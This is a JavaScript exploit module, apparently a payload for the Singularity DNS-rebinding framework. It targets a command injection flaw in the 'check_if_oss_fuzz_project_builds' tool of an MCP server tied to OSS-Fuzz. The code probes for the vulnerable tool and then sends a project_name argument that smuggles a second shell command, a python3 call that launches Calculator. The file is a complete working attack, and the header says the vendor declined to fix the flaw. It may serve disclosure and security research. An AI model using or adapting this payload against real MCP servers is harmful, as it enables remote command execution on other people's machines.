/**
 * This payload exploits a command injection vulnerability found in a Model
 * Context Protocol (MCP) tool named `check_if_oss_fuzz_project_builds`,
 * exposed by an MCP server related to Google's OSS-Fuzz project
 * (https://github.com/google/oss-fuzz).
 *
 * The tool's `project_name` argument was passed to a shell command without
 * sanitization, permitting arbitrary command execution on the MCP server
 * host via DNS rebinding.
 *
 * Reported to Google, who closed the report as out-of-scope / won't-fix.
 */

const OssFuzzMcpRce = () => {

    const endpoint = "/mcp";
    const VULNERABLE_TOOL_NAME = "check_if_oss_fuzz_project_builds";

    let rpcId = 1;
    function nextId() { return rpcId++; }

    function jsonrpc(method, params) {
        return {
            jsonrpc: "2.0",
            id: nextId(),
            method,
            params: params || {}
        };
    }

    // Parse MCP response, handling both plain JSON and SSE ("data: {...}") formats
    function parseMcpResponse(text) {
        if (text.includes('data: ')) {
            const dataMatch = text.match(/data: (.+)$/m);
            if (dataMatch) {
                try {
                    return JSON.parse(dataMatch[1]);
                } catch (_e) { /* fall through to plain JSON parse */ }
            }
        }
        try {
            return JSON.parse(text);
        } catch (_e) {
            return undefined;
        }
    }

    async function mcpRequest(method, params) {
        const response = await sooFetch(endpoint, {
            method: 'POST',
            credentials: 'omit',
            headers: {
                'content-type': 'application/json',
                'accept': 'application/json, text/event-stream'
            },
            body: JSON.stringify(jsonrpc(method, params))
        });
        return parseMcpResponse(await response.text());
    }

    // Invoked after DNS rebinding has been performed
    async function attack(headers, cookie, body) {
        try {
            const initResp = await mcpRequest("initialize", {
                protocolVersion: "2024-11-05",
                capabilities: {},
                clientInfo: { name: "singularity", version: "0.0.1" }
            });

            if (!initResp || initResp.error) {
                console.log('MCP init failed:', initResp?.error || 'No response');
                return;
            }

            console.log(`Attempting command injection exploit via ${VULNERABLE_TOOL_NAME} tool...`);

            // OS-agnostic calculator command, consistent with other Singularity payloads
            const calculatorCommand = 'test; python3 -c "import subprocess; subprocess.run([\'open\', \'-a\', \'Calculator\'])"';

            const exploitResp = await mcpRequest("tools/call", {
                name: VULNERABLE_TOOL_NAME,
                arguments: { project_name: calculatorCommand },
                _meta: { progressToken: 0 }
            });

            if (exploitResp && !exploitResp.error) {
                console.log('Command injection exploit succeeded:', exploitResp);
            } else {
                console.log('Command injection exploit failed (tool may not exist):', exploitResp?.error || 'No response');
            }
        } catch (e) {
            console.log('Command injection exploit error:', e.message);
        }
    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        try {
            const initResp = await mcpRequest("initialize", {
                protocolVersion: "2024-11-05",
                capabilities: {},
                clientInfo: { name: "singularity-probe", version: "1.0.0" }
            });

            if (!initResp || initResp.error) {
                return false;
            }

            // Confirm the specific vulnerable tool is present before attacking
            const listResp = await mcpRequest("tools/list", {});
            const tools = listResp?.result?.tools || [];
            return tools.some(t => t.name === VULNERABLE_TOOL_NAME);
        } catch (e) {
            return false;
        }
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["OSS-Fuzz MCP Command Injection"] = OssFuzzMcpRce();
